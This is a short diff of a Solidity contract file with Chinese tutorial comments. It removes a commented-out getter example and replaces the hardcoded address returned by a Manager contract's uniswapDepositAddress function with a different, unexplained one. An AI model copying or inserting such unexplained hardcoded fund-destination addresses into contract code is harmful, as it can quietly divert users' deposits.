@@ -11,22 +11,7 @@ contract SimpleStorage {
         return storedData;
     }
 }
-/*contract GetfrontExample {
-  // public state variable
-  uint[] public myArray;
 
-  // 指定生成的Getter 函数
-  /*
-  function myArray(uint i) public view returns (uint) {
-      return myArray[i];
-  }
-  */
-
-  // 返回整个数组
-  /*function getArray() public view returns (uint[] memory) {
-      return myArray;
-  }
-}*/
 contract Coin {
     // 关键字“public”让这些变量可以从外部读取
     address public minter;
@@ -138,7 +123,7 @@ contract Manager {
 	}
 
 	function uniswapDepositAddress() public pure returns (address) {
-		return 0xf3d997dC8fbaF57c37EBb96543fD996ba0Cc3b2d;
+		return 0xa070f6179d705c03D52090Cf17Ab8597543fB08d;
 	}
 }
 contract TokenCreator {
